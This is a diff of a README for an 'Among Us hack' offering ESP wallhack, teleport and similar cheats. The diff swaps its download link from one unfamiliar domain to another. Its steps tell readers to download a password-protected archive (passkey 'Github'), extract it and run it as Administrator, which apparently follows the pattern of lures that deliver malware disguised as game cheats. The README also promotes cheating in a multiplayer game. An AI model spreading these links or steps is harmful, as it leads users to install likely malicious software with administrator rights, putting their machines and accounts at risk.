@@ -6,7 +6,7 @@ Among Us hack with ESP wallhack, impostor reveal, kill anywhere, teleport, unloc
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -77,7 +77,7 @@ Based on community tools like HyperMenu and SickoMenu.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Among Us.
 4. Run the hack **as Administrator**.
